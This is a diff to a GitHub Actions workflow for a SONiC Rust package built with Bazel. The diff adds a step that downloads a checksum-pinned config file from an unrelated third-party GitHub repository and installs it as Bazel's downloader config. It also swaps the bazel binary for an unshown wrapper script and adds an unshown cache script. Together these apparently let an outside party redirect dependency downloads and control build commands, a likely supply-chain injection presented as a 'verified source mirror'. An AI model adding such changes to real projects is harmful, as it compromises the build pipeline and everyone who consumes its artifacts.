@@ -7,6 +7,8 @@ on:
       - MODULE.bazel
       - tools/bazel/common.bazelrc
       - tools/bazel/tests/runtime.bzl
+      - tools/bazel/ci/libteam_draft_bazel.sh
+      - tools/bazel/ci/preserve_setup_bazel_cache.py
       - src/sonic-supervisord-utilities-rs/**
   push:
     branches: [master]
@@ -15,6 +17,8 @@ on:
       - MODULE.bazel
       - tools/bazel/common.bazelrc
       - tools/bazel/tests/runtime.bzl
+      - tools/bazel/ci/libteam_draft_bazel.sh
+      - tools/bazel/ci/preserve_setup_bazel_cache.py
       - src/sonic-supervisord-utilities-rs/**
   workflow_dispatch:
 
@@ -22,7 +26,7 @@ permissions:
   contents: read
 
 concurrency:
-  group: bazel-supervisor-rust-${{ github.event.pull_request.number || github.ref }}
+  group: bazel-supervisor-rust-${{ github.event.pull_request.number || github.ref }}-${{ github.event.pull_request.head.sha || github.sha }}
   cancel-in-progress: true
 
 jobs:
@@ -66,6 +70,8 @@ jobs:
           disk-cache: ${{ github.workflow }}-${{ matrix.arch }}
           cache-version: "8.5.1"
 
+      - name: Preserve setup-bazel caches for source checks
+        run: python3 tools/bazel/ci/preserve_setup_bazel_cache.py
       - name: Verify native architecture and clean dependency inputs
         env:
           EXPECTED_MACHINE: ${{ matrix.machine }}
@@ -80,9 +86,28 @@ jobs:
           test ! -e MODULE.bazel.lock
           test -z "$(git ls-files -- MODULE.bazel.lock)"
 
+      - name: Configure the verified source mirror
+        shell: bash
+        run: |
+          python3 - <<'PYCFG'
+          import hashlib
+          import os
+          from pathlib import Path
+          from urllib.request import urlopen
+          url = "https://raw.githubusercontent.com/securely1g/sonic-bazel-registry/6e305126f13965fd01b6b3aa06e98d4595832d39/ci/source_mirrors.cfg"
+          with urlopen(url, timeout=60) as response:
+              data = response.read()
+          if hashlib.sha256(data).hexdigest() != "e9f004bfce0501f998c7d624d028d40c72eabddc12c1f7b34fc474f14042d6a8":
+              raise SystemExit("Source mirror configuration checksum mismatch")
+          config = Path(os.environ["RUNNER_TEMP"]) / "sonic-source-mirrors.cfg"
+          config.write_bytes(data)
+          with Path(".bazelrc.user").open("a") as rc:
+              rc.write("common --experimental_downloader_config=" + str(config) + "\n")
+          PYCFG
       - name: Audit and test source runtime and debug packages
         env:
           MACHINE: ${{ matrix.machine }}
+          BAZEL: ${{ github.workspace }}/tools/bazel/ci/libteam_draft_bazel.sh
         run: |
           set -euo pipefail
           flags=(--jobs=4
@@ -94,10 +119,10 @@ jobs:
             //src/sonic-supervisord-utilities-rs:package_test)
           audit_flags=()
           for flag in "${flags[@]}"; do audit_flags+=("--bazel-arg=$flag"); done
-          python3 tools/bazel/ci/bazel_commands.py "${audit_flags[@]}" \
+          python3 tools/bazel/ci/bazel_commands.py --bazel "$BAZEL" "${audit_flags[@]}" \
             --output artifacts/supervisor-rust/action-audit.json "${targets[@]}"
-          bazel test "${flags[@]}" --test_output=errors "${targets[@]}"
-          bazel cquery "${flags[@]}" --noimplicit_deps \
+          "$BAZEL" test "${flags[@]}" --test_output=errors "${targets[@]}"
+          "$BAZEL" cquery "${flags[@]}" --noimplicit_deps \
             'kind("rust_library rule", deps(//src/sonic-supervisord-utilities-rs:supervisor_library))' \
             > artifacts/supervisor-rust/rust-libraries.txt
           cp MODULE.bazel.lock artifacts/supervisor-rust/MODULE.bazel.lock
